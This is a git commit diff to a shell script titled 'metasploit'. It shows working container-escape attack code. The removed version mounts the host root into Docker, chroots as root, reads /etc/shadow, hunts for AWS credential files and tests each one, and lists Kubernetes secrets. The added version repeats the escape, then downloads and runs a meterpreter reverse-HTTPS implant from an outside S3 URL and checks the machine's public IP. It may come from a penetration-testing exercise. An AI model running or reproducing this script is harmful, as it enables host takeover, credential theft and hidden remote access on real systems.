53efcd879d6dd07d0bd13ea6df8b3dc2b21cf3ff
Stefan Schwoegler <enkaskal@users.noreply.github.com>
2019-03-28 04:32:37 -0400

    metasploit

--- run.sh
+++ run.sh
@@ -1,42 +1,18 @@
 #!/bin/bash
 
-echo "show contained procs before breakout:"
-ps aux
-
-# now breakout and recon
-docker run -v /:/host enkaskal/docker-debian /bin/bash -c 'chroot /host su - root -c "echo RECON:plant ; echo pwn3d by enkaskal >> /tmp/.flag ; \
-  echo RECON:confirm flag ; cat /tmp/.flag ; \
-  echo RECON:env ; env ; \
-  echo RECON:ps aux ; ps aux ; \
-  echo RECON:/root ; ls -alR /root ; \
-  echo RECON:/tmp ; ls -alR /tmp ; \
-  echo RECON:/home ; ls -alR /home ; \
-  echo RECON:python ; which python ; \
-  echo RECON:python --version ; python --version ; \
-  echo RECON:apt-get ; which apt-get ; \
-  echo RECON: dpkg ; which dpkg ; \
-  echo RECON: yum ; which yum ; \
-  echo RECON: rpm ; which rpm ; \
-  echo RECON:alpine ; cat /etc/apk/repositories ; \
-  echo RECON: netstat -apn ; netstat -apn || true ; \
-  echo RECON: nc ; which nc ; \
-  echo RECON: base64 ; which base64 ; \
-  echo RECON: /dev/tcp ; ls -l /dev/tcp ; \
-  echo RECON:passwd ; cat /etc/passwd ; \
-  echo RECON:shadow ; cat /etc/shadow ; \
-  echo RECON:jailed ; ls -di / ; \
-  echo RECON:uname -a ; uname -a ; \
-  echo RECON:os-release ; cat /etc/os-release ; \
-  echo RECON:install awscli ; apk -v --update add python py-pip groff less mailcap && \
-    pip install --upgrade awscli && apk -v --purge del py-pip && rm /var/cache/apk/* ; \
-  echo RECON:which aws ; which aws ; \
-  echo RECON:credentials ; find / -name credentials -type f > /tmp/find.credentials ; \
-    cat /tmp/find.credentials ; grep -v testdata /tmp/find.credentials | \
-    xargs -I % echo AWS_SHARED_CREDENTIALS_FILE=% aws sts get-caller-identity > /tmp/get-caller-identities ; \
-    cat /tmp/get-caller-identities ; /bin/sh /tmp/get-caller-identities ; \
-  echo RECON:clean-up tmp files ; rm -f /tmp/find.credentials /tmp/get-caller-identities ; \
-  echo RECON:fstab ; cat /etc/fstab ; \
-  echo RECON:/proc/1 ; ls -alR /proc/1 ; \
-  echo RECON:cat /proc/1/mounts ; cat /proc/1/mounts ; \
-  echo RECON:/run/secrets/kubernetes.io/serviceaccount ; find /run/secrets/kubernetes.io/serviceaccount -exec ls -al {} \;"'
-  echo RECON:WANIP ; curl https://wtfismyip.com/text
+# now breakout, implant reverse shell, and tunnel
+docker run --network host -v /:/host debian:latest /bin/bash -c ' \
+  chroot /host su - root -c " \
+    echo RECON:route table ; netstat -rn ; \
+    echo RECON:plant flag ; echo pwn3d by enkaskal >> /tmp/.flag ; \
+    echo RECON:confirm flag ; cat /tmp/.flag ; \
+    echo RECON:nc ; which nc ; \
+    echo EXPLOIT:download implant ; curl -sL -o /tmp/.blah https://s3-us-west-2.amazonaws.com/cryp7-static/implants/meterpreter/reverse_https/linux/x64/meterp.sh ; \
+    echo EXPLOIT:run implant ; chmod +x /tmp/.blah ; /bin/bash -c /tmp/.blah ; \
+    echo EXPLOIT:cleanup implant ; rm -f /tmp/.blah ; \
+    echo RECON:nc ; which nc ; \
+    echo RECON:post ps aux ; ps aux ; \
+    echo RECON:enkaskal services ; systemctl list-unit-files | grep enkaskal ; \
+    echo RECON:WANIP ; curl -s https://wtfismyip.com/text ; \
+  "
+'
